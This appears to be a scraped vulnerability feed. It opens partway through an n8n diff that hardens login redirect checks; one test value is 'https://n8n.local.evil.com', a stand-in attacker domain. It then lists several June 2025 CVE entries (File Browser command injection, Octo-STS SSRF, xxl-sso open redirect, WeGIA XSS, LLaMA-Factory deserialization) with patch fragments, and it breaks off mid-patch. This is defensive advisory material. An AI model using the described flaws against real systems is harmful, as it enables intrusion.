index 5652122b137ff..28ae6a8488de9 100644
--- a/packages/frontend/editor-ui/src/views/SigninView.test.ts
+++ b/packages/frontend/editor-ui/src/views/SigninView.test.ts
@@ -2,11 +2,12 @@ import { createComponentRenderer } from '@/__tests__/render';
 import { mockedStore } from '@/__tests__/utils';
 import { createTestingPinia } from '@pinia/testing';
 import userEvent from '@testing-library/user-event';
-import { useRouter } from 'vue-router';
+import { useRouter, useRoute } from 'vue-router';
 import SigninView from '@/views/SigninView.vue';
 import { useUsersStore } from '@/stores/users.store';
 import { useSettingsStore } from '@/stores/settings.store';
 import { useTelemetry } from '@/composables/useTelemetry';
+import { VIEWS } from '@/constants';
 
 vi.mock('vue-router', () => {
 	const push = vi.fn();
@@ -14,7 +15,7 @@ vi.mock('vue-router', () => {
 		useRouter: () => ({
 			push,
 		}),
-		useRoute: () => ({
+		useRoute: vi.fn().mockReturnValue({
 			query: {
 				redirect: '/home/workflows',
 			},
@@ -43,20 +44,7 @@ let router: ReturnType<typeof useRouter>;
 let telemetry: ReturnType<typeof useTelemetry>;
 
 describe('SigninView', () => {
-	beforeEach(() => {
-		createTestingPinia();
-		usersStore = mockedStore(useUsersStore);
-		settingsStore = mockedStore(useSettingsStore);
-
-		router = useRouter();
-		telemetry = useTelemetry();
-	});
-
-	it('should not throw error when opened', () => {
-		expect(() => renderComponent()).not.toThrow();
-	});
-
-	it('should show and submit email/password form (happy path)', async () => {
+	const signInWithValidUser = async () => {
 		settingsStore.isCloudDeployment = false;
 		usersStore.loginWithCreds.mockResolvedValueOnce();
 
@@ -83,6 +71,27 @@ describe('SigninView', () => {
 		await userEvent.type(passwordInput, 'password');
 
 		await userEvent.click(submitButton);
+	};
+
+	beforeEach(() => {
+		createTestingPinia();
+		usersStore = mockedStore(useUsersStore);
+		settingsStore = mockedStore(useSettingsStore);
+
+		router = useRouter();
+		telemetry = useTelemetry();
+	});
+
+	afterEach(() => {
+		vi.clearAllMocks();
+	});
+
+	it('should not throw error when opened', () => {
+		expect(() => renderComponent()).not.toThrow();
+	});
+
+	it('should show and submit email/password form (happy path)', async () => {
+		await signInWithValidUser();
 
 		expect(usersStore.loginWithCreds).toHaveBeenCalledWith({
 			emailOrLdapLoginId: 'test@n8n.io',
@@ -97,4 +106,89 @@ describe('SigninView', () => {
 
 		expect(router.push).toHaveBeenCalledWith('/home/workflows');
 	});
+
+	describe('when redirect query parameter is set', () => {
+		const ORIGIN_URL = 'https://n8n.local';
+		let route: ReturnType<typeof useRoute>;
+
+		beforeEach(() => {
+			route = useRoute();
+			global.window = Object.create(window);
+
+			Object.defineProperty(window, 'location', {
+				value: {
+					href: '',
+					origin: ORIGIN_URL,
+				},
+				writable: true,
+			});
+		});
+
+		it('should redirect to homepage with router if redirect url does not contain the origin domain', async () => {
+			vi.spyOn(route, 'query', 'get').mockReturnValue({
+				redirect: 'https://n8n.local.evil.com',
+			});
+
+			const hrefSpy = vi.spyOn(window.location, 'href', 'set');
+
+			await signInWithValidUser();
+
+			expect(hrefSpy).not.toHaveBeenCalled();
+			expect(router.push).toHaveBeenCalledWith({ name: VIEWS.HOMEPAGE });
+		});
+
+		it('should redirect to homepage with router if redirect url does not contain a valid URL', async () => {
+			vi.spyOn(route, 'query', 'get').mockReturnValue({
+				redirect: 'not-a-valid-url',
+			});
+
+			const hrefSpy = vi.spyOn(window.location, 'href', 'set');
+
+			await signInWithValidUser();
+
+			expect(hrefSpy).not.toHaveBeenCalled();
+			expect(router.push).toHaveBeenCalledWith({ name: VIEWS.HOMEPAGE });
+		});
+
+		it('should redirect to given route if redirect url contains the origin domain', async () => {
+			const validRedirectUrl = 'https://n8n.local/valid-redirect';
+			vi.spyOn(route, 'query', 'get').mockReturnValue({
+				redirect: validRedirectUrl,
+			});
+
+			const hrefSpy = vi.spyOn(window.location, 'href', 'set');
+
+			await signInWithValidUser();
+
+			expect(hrefSpy).toHaveBeenCalledWith(validRedirectUrl);
+			expect(router.push).not.toHaveBeenCalled();
+		});
+
+		it('should redirect with router to given route if redirect url is a local path', async () => {
+			const validLocalRedirectUrl = '/valid-redirect';
+			vi.spyOn(route, 'query', 'get').mockReturnValue({
+				redirect: validLocalRedirectUrl,
+			});
+
+			const hrefSpy = vi.spyOn(window.location, 'href', 'set');
+
+			await signInWithValidUser();
+
+			expect(hrefSpy).not.toHaveBeenCalled();
+			expect(router.push).toHaveBeenCalledWith(validLocalRedirectUrl);
+		});
+
+		it('should redirect to homepage with router if redirect url is empty', async () => {
+			vi.spyOn(route, 'query', 'get').mockReturnValue({
+				redirect: '',
+			});
+
+			const hrefSpy = vi.spyOn(window.location, 'href', 'set');
+
+			await signInWithValidUser();
+
+			expect(hrefSpy).not.toHaveBeenCalled();
+			expect(router.push).toHaveBeenCalledWith({ name: VIEWS.HOMEPAGE });
+		});
+	});
 });
diff --git a/packages/frontend/editor-ui/src/views/SigninView.vue b/packages/frontend/editor-ui/src/views/SigninView.vue
index 6290e77b16662..d952e0e2b795e 100644
--- a/packages/frontend/editor-ui/src/views/SigninView.vue
+++ b/packages/frontend/editor-ui/src/views/SigninView.vue
@@ -101,7 +101,19 @@ const onEmailPasswordSubmitted = async (form: EmailOrLdapLoginIdAndPassword) =>
 
 const isRedirectSafe = () => {
 	const redirect = getRedirectQueryParameter();
-	return redirect.startsWith('/') || redirect.startsWith(window.location.origin);
+
+	// Allow local redirects
+	if (redirect.startsWith('/')) {
+		return true;
+	}
+
+	try {
+		// Only allow origin domain redirects
+		const url = new URL(redirect);
+		return url.origin === window.location.origin;
+	} catch {
+		return false;
+	}
 };
 
 const getRedirectQueryParameter = () => {


================================================================================


CVE ID: CVE-2013-1424
Published: 2025-06-26T20:15:25.090
Modified: 2025-08-06T16:29:38.780
CVSS Score: 5.6 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')

Description:
Buffer overflow vulnerability in matplotlib.This issue affects matplotlib: before upstream commit ba4016014cb4fb4927e36ce8ea429fed47dcb787.

References (2):
  1. https://bugs.debian.org/775691 [Issue Tracking, Mailing List]
  2. https://github.com/matplotlib/matplotlib/commit/ba4016014cb4fb4927e36ce8ea429fed47dcb787 [Patch]

Attempting to extract code examples from references...

--- Code from https://bugs.debian.org/775691 ---
debian-bugs-dist@lists.debian.org, Sandro Tosi &lt;morph@debian.org&gt;

Bug#775691

src:matplotlib

================================================================================


CVE ID: CVE-2025-52904
Published: 2025-06-26T19:15:21.743
Modified: 2025-08-05T18:25:10.067
CVSS Score: 8.0 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H

CWE Categories:
  - CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')

Description:
File Browser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit files. In version 2.32.0 of the web application, all users have a scope assigned, and they only have access to the files within that scope. The Command Execution feature of Filebrowser allows the execution of shell commands which are not restricted to the scope, potentially giving an attacker read and write access to all files managed by the server. Until this issue is fixed, the maintainers recommend to completely disable `Execute commands` for all accounts. Since the command execution is an inherently dangerous feature that is not used by all deployments, it should be possible to completely disable it in the application's configuration. As a defense-in-depth measure, organizations not requiring command execution should operate the Filebrowser from a distroless container image. A patch version has been pushed to disable the feature for all existent installations, and making it opt-in. A warning has been added to the documentation and is printed on the console if the feature is enabled. Due to the project being in maintenance-only mode, the bug has not been fixed. Fix is tracked on pull request 5199.

References (5):
  1. https://github.com/GoogleContainerTools/distroless [Product]
  2. https://github.com/filebrowser/filebrowser/issues/5199 [Issue Tracking]
  3. https://github.com/filebrowser/filebrowser/security/advisories/GHSA-hc8f-m8g5-8362 [Exploit, Vendor Advisory, Mitigation]
  4. https://sloonz.github.io/posts/sandboxing-1 [Technical Description]
  5. https://github.com/filebrowser/filebrowser/security/advisories/GHSA-hc8f-m8g5-8362 [Exploit, Vendor Advisory, Mitigation]

Attempting to extract code examples from references...

--- Code from https://github.com/GoogleContainerTools/distroless ---
application/vnd.oci.image.manifest.v1+json

application/vnd.oci.image.index.v1+json

gcr.io/distroless/static-debian12

================================================================================


CVE ID: CVE-2025-52903
Published: 2025-06-26T19:15:21.587
Modified: 2025-08-05T18:23:52.067
CVSS Score: 8.0 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H

CWE Categories:
  - CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')

Description:
File Browser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit files. In version 2.32.0, the Command Execution feature of File Browser only allows the execution of shell command which have been predefined on a user-specific allowlist. Many tools allow the execution of arbitrary different commands, rendering this limitation void. The concrete impact depends on the commands being granted to the attacker, but the large number of standard commands allowing the execution of subcommands makes it likely that every user having the `Execute commands` permissions can exploit this vulnerability. Everyone who can exploit it will have full code execution rights with the uid of the server process. Until this issue is fixed, the maintainers recommend to completely disable `Execute commands` for all accounts. Since the command execution is an inherently dangerous feature that is not used by all deployments, it should be possible to completely disable it in the application's configuration. As a defense-in-depth measure, organizations not requiring command execution should operate the Filebrowser from a distroless container image. A patch version has been pushed to disable the feature for all existent installations, and making it opt-in. A warning has been added to the documentation and is printed on the console if the feature is enabled. Due to the project being in maintenance-only mode, the bug has not been fixed. The fix is tracked on pull request 5199.

References (5):
  1. https://github.com/GoogleContainerTools/distroless [Product]
  2. https://github.com/filebrowser/filebrowser/issues/5199 [Issue Tracking]
  3. https://github.com/filebrowser/filebrowser/security/advisories/GHSA-3q2w-42mv-cph4 [Exploit, Vendor Advisory, Mitigation]
  4. https://manpages.debian.org/bookworm/util-linux/prlimit.1.en.html [Technical Description]
  5. https://github.com/filebrowser/filebrowser/security/advisories/GHSA-3q2w-42mv-cph4 [Exploit, Vendor Advisory, Mitigation]

Attempting to extract code examples from references...

--- Code from https://github.com/GoogleContainerTools/distroless ---
application/vnd.oci.image.manifest.v1+json

application/vnd.oci.image.index.v1+json

gcr.io/distroless/static-debian12

================================================================================


CVE ID: CVE-2025-53013
Published: 2025-06-26T18:15:23.370
Modified: 2025-08-20T20:15:32.710
CVSS Score: 5.2 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N

CWE Categories:
  - CWE-287: Improper Authentication

Description:
Himmelblau is an interoperability suite for Microsoft Azure Entra ID and Intune. A vulnerability present in versions 0.9.10 through 0.9.16 allows a user to authenticate to a Linux host via Himmelblau using an *invalid* Linux Hello PIN, provided the host is offline. While the user gains access to the local system, Single Sign-On (SSO) fails due to the network being down and the inability to issue tokens (due to a failure to unlock the Hello key). The core issue lies in an incorrect assumption within the `acquire_token_by_hello_for_business_key` function: it was expected to return a `TPMFail` error for an invalid Hello key when offline, but instead, a preceding nonce request resulted in a `RequestFailed` error, leading the system to erroneously transition to an offline success state without validating the Hello key unlock. This impacts systems using Himmelblau for authentication when operating in an offline state with Hello PIN authentication enabled. Rocky Linux 8 (and variants) are not affected by this vulnerability. The problem is resolved in Himmelblau version 0.9.17. A workaround is available for users who cannot immediately upgrade. Disabling Hello PIN authentication by setting `enable_hello = false` in `/etc/himmelblau/himmelblau.conf` will mitigate the vulnerability.

References (5):
  1. https://github.com/himmelblau-idm/himmelblau/commit/64b03739f1d5ee472b1cff3ed20ed9af1c65a6f8
  2. https://github.com/himmelblau-idm/himmelblau/commit/78477d684df710d57c10091c87b92665cfac98ae
  3. https://github.com/himmelblau-idm/himmelblau/security/advisories/GHSA-j93j-pwm6-p97j
  4. https://www.vicarius.io/vsociety/posts/cve-2025-53013-detect-himmelblau-vulnerable-configuration
  5. https://www.vicarius.io/vsociety/posts/cve-2025-53013-mitigate-himmelblau-vulnerable-configuration

Attempting to extract code examples from references...

--- Code from https://github.com/himmelblau-idm/himmelblau/commit/64b03739f1d5ee472b1cff3ed20ed9af1c65a6f8 ---
From 697f91288f32ca121cb98db4441ed0dce0cd8737 Mon Sep 17 00:00:00 2001
From: David Mulder <dmulder@samba.org>
Date: Thu, 26 Jun 2025 09:38:10 -0600
Subject: [PATCH] Offline auth permits authentication with invalid Hello PIN

Signed-off-by: David Mulder <dmulder@samba.org>
---
 src/common/src/idprovider/himmelblau.rs | 17 +++++++++++++++++
 1 file changed, 17 insertions(+)

diff --git a/src/common/src/idprovider/himmelblau.rs b/src/common/src/idprovider/himmelblau.rs
index 17027948..d715fb06 100644
--- a/src/common/src/idprovider/himmelblau.rs
+++ b/src/common/src/idprovider/himmelblau.rs
@@ -1331,6 +1331,23 @@ impl IdProvider for HimmelblauProvider {
         }
         macro_rules! auth_and_validate_hello_key {
             ($hello_key:ident, $cred:ident) => {{
+                // CRITICAL: Validate that we can load the key, otherwise the offline
+                // fallback will allow the user to authenticate with a bad PIN here.
+                // `acquire_token_by_hello_for_business_key` CAN (and probably will)
+                // respond with a `RequestFailed` prior to validating the PIN, since
+                // the Nonce request will fail (which is sent prior to validation).
+                let pin = PinValue::new(&$cred).map_err(|e| {
+                    error!("Failed setting pin value: {:?}", e);
+                    IdpError::Tpm
+                })?;
+                if let Err(e) = tpm.identity_key_load(machine_key, Some(&pin), &$hello_key) {
+                    error!("{:?}", e);
+                    return Ok((
+                        AuthResult::Denied("Failed to authenticate with Hello PIN.".to_string()),
+                        AuthCacheAction::None,
+                    ));
+                }
+
                 // If an app_id is defined in the config, the app should have the
                 // GroupMember.Read.All API permission.
                 let cfg = self.config.read().await;


================================================================================


CVE ID: CVE-2025-49603
Published: 2025-06-26T18:15:22.710
Modified: 2025-06-26T21:15:28.150
CVSS Score: 9.1 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

CWE Categories:
  - CWE-284: CWE-284

Description:
Northern.tech Mender Server before 3.7.11 and 4.x before 4.0.1 has Incorrect Access Control.

References (2):
  1. https://mender.io/blog/cve-2025-49603-improper-access-control-of-device-groups-in-mender-server
  2. https://northern.tech

Attempting to extract code examples from references...

--- Code from https://mender.io/blog/cve-2025-49603-improper-access-control-of-device-groups-in-mender-server ---
appVersion

================================================================================


CVE ID: CVE-2025-52477
Published: 2025-06-26T17:15:30.897
Modified: 2025-06-26T18:57:43.670
CVSS Score: 8.6 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N

CWE Categories:
  - CWE-918: Server-Side Request Forgery (SSRF)

Description:
Octo-STS is a GitHub App that acts like a Security Token Service (STS) for the GitHub API. Octo-STS versions before v0.5.3 are vulnerable to unauthenticated SSRF by abusing fields in OpenID Connect tokens. Malicious tokens were shown to trigger internal network requests which could reflect error logs with sensitive information. Upgrade to v0.5.3 to resolve this issue. This version includes patch sets to sanitize input and redact logging.

References (4):
  1. https://github.com/octo-sts/app/commit/0f177fde54f9318e33f0bba6abaea9463a7c3afd
  2. https://github.com/octo-sts/app/commit/b3976e39bd8c8c217c0670747d34a4499043da92
  3. https://github.com/octo-sts/app/security/advisories/GHSA-h3qp-hwvr-9xcq
  4. https://github.com/octo-sts/app/security/advisories/GHSA-h3qp-hwvr-9xcq

Attempting to extract code examples from references...

--- Code from https://github.com/octo-sts/app/commit/0f177fde54f9318e33f0bba6abaea9463a7c3afd ---
From 0f177fde54f9318e33f0bba6abaea9463a7c3afd Mon Sep 17 00:00:00 2001
From: Carlos Tadeu Panato Junior <ctadeu@gmail.com>
Date: Thu, 26 Jun 2025 18:08:40 +0200
Subject: [PATCH] Merge commit from fork

---
 pkg/octosts/octosts.go | 22 +++++++++++++++-------
 1 file changed, 15 insertions(+), 7 deletions(-)

diff --git a/pkg/octosts/octosts.go b/pkg/octosts/octosts.go
index 17d2c426..9d4602d9 100644
--- a/pkg/octosts/octosts.go
+++ b/pkg/octosts/octosts.go
@@ -111,7 +111,8 @@ func (s *sts) Exchange(ctx context.Context, request *pboidc.ExchangeRequest) (_
 	// Validate the Bearer token.
 	issuer, err := apiauth.ExtractIssuer(bearer)
 	if err != nil {
-		return nil, status.Errorf(codes.InvalidArgument, "invalid bearer token: %v", err)
+		clog.FromContext(ctx).Debugf("invalid bearer token: %v", err)
+		return nil, status.Error(codes.InvalidArgument, "invalid bearer token")
 	}
 
 	// Validate issuer format
@@ -122,7 +123,8 @@ func (s *sts) Exchange(ctx context.Context, request *pboidc.ExchangeRequest) (_
 	// Fetch the provider from the cache or create a new one and add to the cache
 	p, err := provider.Get(ctx, issuer)
 	if err != nil {
-		return nil, status.Errorf(codes.InvalidArgument, "unable to fetch or create the provider: %v", err)
+		clog.FromContext(ctx).Debugf("unable to fetch or create the provider: %v", err)
+		return nil, status.Error(codes.InvalidArgument, "unable to fetch or create the provider")
 	}
 
 	verifier := p.Verifier(&oidc.Config{
@@ -131,7 +133,8 @@ func (s *sts) Exchange(ctx context.Context, request *pboidc.ExchangeRequest) (_
 	})
 	tok, err := verifier.Verify(ctx, bearer)
 	if err != nil {
-		return nil, status.Errorf(codes.Unauthenticated, "unable to validate token: %v", err)
+		clog.FromContext(ctx).Debugf("unable to validate token: %v", err)
+		return nil, status.Error(codes.Unauthenticated, "unable to verify bearer token")
 	}
 	// This is typically overwritten below, but we populate this here to enrich
 	// certain error paths with the issuer and subject.
@@ -170,18 +173,23 @@ func (s *sts) Exchange(ctx context.Context, request *pboidc.ExchangeRequest) (_
 			// body typically, so extract that.
 			if herr.Response.StatusCode == http.StatusUnprocessableEntity {
 				if body, err := io.ReadAll(herr.Response.Body); err == nil {
-					return nil, status.Errorf(codes.PermissionDenied, "token exchange failure: %s", body)
+					clog.FromContext(ctx).Debugf("token exchange failure (StatusUnprocessableEntity): %s", body)
+					return nil, status.Error(codes.PermissionDenied, "token exchange failure (StatusUnprocessableEntity)")
 				}
 			} else {
 				body, err := httputil.DumpResponse(herr.Response, true)
 				if err == nil {
-					clog.FromContext(ctx).Warnf("token exchange failure: %s", body)
+					clog.FromContext(ctx).Warn("token exchange failure, redacting body in logs")
+					// Log the response body in debug mode only, as it may contain sensitive information.
+					clog.FromContext(ctx).Debugf("token exchange failure: %s", body)
 				}
 			}
 		} else {
-			clog.FromContext(ctx).Warnf("token exchange failure: %v", err)
+			clog.FromContext(ctx).Debugf("token exchange failure: %v", err)
+			clog.FromContext(ctx).Warn("token exchange failure, redacting error in logs")
 		}
-		return nil, status.Errorf(codes.Internal, "failed to get token: %v", err)
+		clog.FromContext(ctx).Debugf("failed to get token: %v", err)
+		return nil, status.Error(codes.Internal, "failed to get token")
 	}
 
 	// Compute the SHA256 hash of the token and store the hex-encoded value into e.TokenSHA256


================================================================================


CVE ID: CVE-2025-6702
Published: 2025-06-26T16:15:38.033
Modified: 2025-07-10T01:02:51.507
CVSS Score: 4.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-266: CWE-266
  - CWE-285: CWE-285
  - CWE-863: Incorrect Authorization

Description:
A vulnerability, which was classified as problematic, was found in linlinjava litemall 1.8.0. Affected is an unknown function of the file /wx/comment/post. The manipulation of the argument adminComment leads to improper authorization. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (5):
  1. https://ctf-n0el4kls.notion.site/Litemall-Mass-Assignment-Vulnerability-in-wx-comment-post-21441990f447808b86d1cb15e37ecae9?source=copy_link [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.313968 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.313968 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.597473 [Third Party Advisory, VDB Entry]
  5. https://ctf-n0el4kls.notion.site/Litemall-Mass-Assignment-Vulnerability-in-wx-comment-post-21441990f447808b86d1cb15e37ecae9 [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://ctf-n0el4kls.notion.site/Litemall-Mass-Assignment-Vulnerability-in-wx-comment-post-21441990f447808b86d1cb15e37ecae9?source=copy_link ---
org/linlinjava/litemall/wx/web/WxCommentController.java:90

/wx/comment/post

adminContent

================================================================================


CVE ID: CVE-2025-6701
Published: 2025-06-26T16:15:36.930
Modified: 2025-07-10T01:04:29.743
CVSS Score: 3.5 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-601: URL Redirection to Untrusted Site ('Open Redirect')

Description:
A vulnerability, which was classified as problematic, has been found in Xuxueli xxl-sso 1.1.0. This issue affects some unknown processing of the file /xxl-sso-server/doLogin. The manipulation of the argument redirect_url leads to open redirect. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (5):
  1. https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250616-02.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.313967 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.313967 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.597472 [Third Party Advisory, VDB Entry]
  5. https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250616-02.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313967 ---
redirect_url

================================================================================


CVE ID: CVE-2025-6700
Published: 2025-06-26T16:15:35.740
Modified: 2025-09-15T14:02:26.680
CVSS Score: 4.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - CWE-94: Improper Control of Generation of Code ('Code Injection')
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
A vulnerability classified as problematic was found in Xuxueli xxl-sso 1.1.0. This vulnerability affects unknown code of the file /xxl-sso-server/login. The manipulation of the argument errorMsg leads to cross site scripting. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (4):
  1. https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250616-01/report.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.313966 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.313966 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.597456 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313966 ---
errorMsg

================================================================================


CVE ID: CVE-2025-6699
Published: 2025-06-26T16:15:34.590
Modified: 2025-07-01T15:42:08.920
CVSS Score: 3.5 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - CWE-94: Improper Control of Generation of Code ('Code Injection')
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
A vulnerability classified as problematic has been found in LabRedesCefetRJ WeGIA 3.4.0. This affects an unknown part of the file /html/funcionario/cadastro_funcionario.php of the component Cadastro de Funcionário. The manipulation of the argument Nome/Sobrenome leads to cross site scripting. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. This is a different issue than CVE-2025-23030. The vendor was contacted early about this disclosure but did not respond in any way.

References (4):
  1. https://github.com/RaulPazemecxas/PoCVulDb/blob/main/README7.md [Broken Link]
  2. https://vuldb.com/?ctiid.313965 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.313965 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.597401 [Exploit, Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313965 ---
Nome/Sobrenome

================================================================================


CVE ID: CVE-2025-6698
Published: 2025-06-26T15:15:25.023
Modified: 2025-07-01T17:46:03.453
CVSS Score: 3.5 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - CWE-94: Improper Control of Generation of Code ('Code Injection')
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
A vulnerability was found in LabRedesCefetRJ WeGIA 3.4.0. It has been rated as problematic. Affected by this issue is some unknown functionality of the file /html/matPat/adicionar_tipoSaida.php of the component Adicionar tipo. The manipulation of the argument Insira o novo tipo leads to cross site scripting. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (5):
  1. https://github.com/RaulPazemecxas/PoCVulDb/blob/main/README6.md [Broken Link]
  2. https://vuldb.com/?ctiid.313964 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.313964 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.597389 [Exploit, Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.597389 [Exploit, Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313964 ---
Insira o novo tipo

================================================================================


CVE ID: CVE-2025-6697
Published: 2025-06-26T15:15:24.840
Modified: 2025-07-01T17:57:54.150
CVSS Score: 3.5 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - CWE-94: Improper Control of Generation of Code ('Code Injection')
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
A vulnerability was found in LabRedesCefetRJ WeGIA 3.4.0. It has been declared as problematic. Affected by this vulnerability is an unknown functionality of the file /html/matPat/adicionar_tipoEntrada.php of the component Adicionar tipo. The manipulation of the argument Insira o novo tipo leads to cross site scripting. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (5):
  1. https://github.com/RaulPazemecxas/PoCVulDb/blob/main/README5.md [Broken Link]
  2. https://vuldb.com/?ctiid.313963 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.313963 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.597386 [Exploit, Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.597386 [Exploit, Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313963 ---
Insira o novo tipo

================================================================================


CVE ID: CVE-2025-6696
Published: 2025-06-26T15:15:24.633
Modified: 2025-07-01T18:00:07.820
CVSS Score: 3.5 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - CWE-94: Improper Control of Generation of Code ('Code Injection')
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
A vulnerability was found in LabRedesCefetRJ WeGIA 3.4.0. It has been classified as problematic. Affected is an unknown function of the file /html/atendido/Cadastro_Atendido.php of the component Cadastro de Atendio. The manipulation of the argument Nome/Sobrenome leads to cross site scripting. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. This is a different issue than CVE-2025-22615. The vendor was contacted early about this disclosure but did not respond in any way.

References (4):
  1. https://github.com/RaulPazemecxas/PoCVulDb/blob/main/README3.md [Broken Link]
  2. https://vuldb.com/?ctiid.313962 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.313962 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.597078 [Exploit, Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313962 ---
Nome/Sobrenome

================================================================================


CVE ID: CVE-2025-53002
Published: 2025-06-26T15:15:23.873
Modified: 2025-09-02T17:49:44.077
CVSS Score: 8.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:H

CWE Categories:
  - CWE-94: Improper Control of Generation of Code ('Code Injection')
  - CWE-502: Deserialization of Untrusted Data

Description:
LLaMA-Factory is a tuning library for large language models. A remote code execution vulnerability was discovered in LLaMA-Factory versions up to and including 0.9.3 during the LLaMA-Factory training process. This vulnerability arises because the `vhead_file` is loaded without proper safeguards, allowing malicious attackers to execute arbitrary malicious code on the host system simply by passing a malicious `Checkpoint path` parameter through the `WebUI` interface. The attack is stealthy, as the victim remains unaware of the exploitation. The root cause is that the `vhead_file` argument is loaded without the secure parameter `weights_only=True`. Version 0.9.4 contains a fix for the issue.

References (3):
  1. https://drive.google.com/file/d/1AddKm2mllsXfuvL4Tvbn_WJdjEOYXx4y/view?usp=sharing [Exploit]
  2. https://github.com/hiyouga/LLaMA-Factory/commit/bb7bf51554d4ba8432333c35a5e3b52705955ede [Patch]
  3. https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-xj56-p8mm-qmxj [Third Party Advisory, Exploit]

Attempting to extract code examples from references...

--- Code from https://github.com/hiyouga/LLaMA-Factory/commit/bb7bf51554d4ba8432333c35a5e3b52705955ede ---
From bb7bf51554d4ba8432333c35a5e3b52705955ede Mon Sep 17 00:00:00 2001
From: Yaowei Zheng <hiyouga@buaa.edu.cn>
Date: Thu, 26 Jun 2025 13:55:42 +0800
Subject: [PATCH] Merge commit from fork

---
 src/llamafactory/model/model_utils/valuehead.py | 2 +-
